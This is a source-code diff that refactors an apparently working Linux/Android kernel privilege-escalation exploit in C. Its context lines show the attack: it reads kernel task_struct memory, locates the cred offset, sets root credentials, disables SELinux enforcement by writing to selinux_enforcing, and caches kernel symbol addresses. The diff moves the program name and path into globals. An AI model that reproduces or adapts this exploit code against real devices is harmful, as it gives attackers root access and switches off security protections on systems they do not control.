@@ -81,6 +81,8 @@ int quiet = 0;
 
 int have_kallsyms = 0;
 int kernel3 = 1;
+char* myPath;
+char* myName;
 
 struct kallsyms {
     unsigned long addresses;
@@ -691,15 +693,10 @@ int verifyCred(unsigned long cred_ptr) {
     return uid == getuid();
 }
 
-int getCredOffset(unsigned char* task_struct_data, char* execName) {
+int getCredOffset(unsigned char* task_struct_data) {
     char taskname[16];
-    char* p = strrchr(execName, '/');
-    if (p == NULL)
-        p = execName;
-    else
-        p++;
-    unsigned n = MIN(strlen(p)+1, 16);
-    memcpy(taskname, p, n);
+    unsigned n = MIN(strlen(myName)+1, 16);
+    memcpy(taskname, myName, n);
     taskname[15] = 0; 
     
     for (int i=OFFSET__task_struct__stack+8; i<PAGE-16; i+=8) {
@@ -888,29 +885,23 @@ unsigned long findSymbol_memory_search(char* symbol) {
     return 0;
 }
 
-char* allocateSymbolCachePathName(char* execName, char* symbol) {
-    char* p = strrchr(execName, '/');
-    unsigned n;
-    if (p == NULL)
-        n = 0;
-    else
-        n = p-execName+1;
+char* allocateSymbolCachePathName(char* symbol) {
+    int n = strlen(myPath);
 
     char* pathname = malloc(strlen(symbol)+7+1+n);
     if (pathname == NULL) {
         errno = 0;
         error("allocating memory for pathname");
     }
-    strncpy(pathname, execName, n);
-    pathname[n] = 0;
+    strcpy(pathname, myPath);
     strcat(pathname, symbol);
     strcat(pathname, ".symbol");
 
     return pathname;
 }
 
-unsigned long findSymbol_in_cache(char* execName, char* symbol) {
-    char* pathname = allocateSymbolCachePathName(execName, symbol);
+unsigned long findSymbol_in_cache(char* symbol) {
+    char* pathname = allocateSymbolCachePathName(symbol);
     unsigned long address = 0;
     
     FILE *cached = fopen(pathname, "r");
@@ -924,10 +915,10 @@ unsigned long findSymbol_in_cache(char* execName, char* symbol) {
     return address;
 }
 
-void cacheSymbol(char* execName, char* symbol, unsigned long address) {
+void cacheSymbol(char* symbol, unsigned long address) {
 #ifdef KALLSYMS_CACHING
-    if (address != 0 && address != findSymbol_in_cache(execName, symbol)) {
-        char* pathname = allocateSymbolCachePathName(execName, symbol);
+    if (address != 0 && address != findSymbol_in_cache(symbol)) {
+        char* pathname = allocateSymbolCachePathName(symbol);
         FILE *cached = fopen(pathname, "w");
         if (cached != NULL) {
             fprintf(cached, "%lx\n", address);
@@ -942,12 +933,12 @@ void cacheSymbol(char* execName, char* symbol, unsigned long address) {
 #endif
 }
     
-unsigned long findSymbol(char* execName, unsigned long pointInKernelMemory, char *symbol)
+unsigned long findSymbol(unsigned long pointInKernelMemory, char *symbol)
 {
     unsigned long address = 0;
     
 #ifdef KALLSYMS_CACHING    
-    address = findSymbol_in_cache(execName, symbol);
+    address = findSymbol_in_cache(symbol);
     if (address != 0)
         return address;
 #endif
@@ -1019,7 +1010,15 @@ int main(int argc, char **argv)
     else
         p++;
     
-    if (!strcmp(p,"su")) {
+    myName = p;
+    int n = p-argv[0];
+    myPath = malloc(n+1);
+    if (myPath == NULL)
+        error("allocating memory");
+    strncpy(myPath, argv[0], n);
+    myPath[n] = 0;
+    
+    if (!strcmp(myName,"su")) {
         quiet = 1;
     }        
     
@@ -1102,7 +1101,7 @@ int main(int argc, char **argv)
     unsigned char task_struct_data[PAGE+16];
     kernel_read(task_struct_ptr, task_struct_data, PAGE);
         
-    unsigned long offset_task_struct__cred = getCredOffset(task_struct_data, argv[0]);
+    unsigned long offset_task_struct__cred = getCredOffset(task_struct_data);
     
     unsigned long cred_ptr = kernel_read_ulong(task_struct_ptr + offset_task_struct__cred);
 
@@ -1117,8 +1116,8 @@ int main(int argc, char **argv)
     message("MAIN: search_base = %lx", search_base);
     
     message("MAIN: searching for selinux_enforcing");
-    unsigned long selinux_enforcing = findSymbol(argv[0], search_base, "selinux_enforcing");
-//    unsigned long selinux_enabled = findSymbol(argv[0], search_base, "selinux_enabled");
+    unsigned long selinux_enforcing = findSymbol(search_base, "selinux_enforcing");
+//    unsigned long selinux_enabled = findSymbol(search_base, "selinux_enabled");
 
     message("MAIN: setting root credentials with cred offset %lx", offset_task_struct__cred);
     
@@ -1166,10 +1165,10 @@ int main(int argc, char **argv)
         kernel_write_uint(selinux_enforcing, 0);
         message("MAIN: disabled selinux enforcing");
         
-    cacheSymbol(argv[0], "selinux_enforcing", selinux_enforcing);
+    cacheSymbol("selinux_enforcing", selinux_enforcing);
     
     if (rejoinNS) {
-        message("re-joining the init mount namespace");
+        message("MAIN: re-joining the init mount namespace");
         int fd = open("/proc/1/ns/mnt", O_RDONLY);
 
         if (fd < 0) {
@@ -1181,7 +1180,7 @@ int main(int argc, char **argv)
             error("setns");
         }
 
-        message("re-joining the init net namespace");
+        message("MAIN: re-joining the init net namespace");
 
         fd = open("/proc/1/ns/net", O_RDONLY);
 
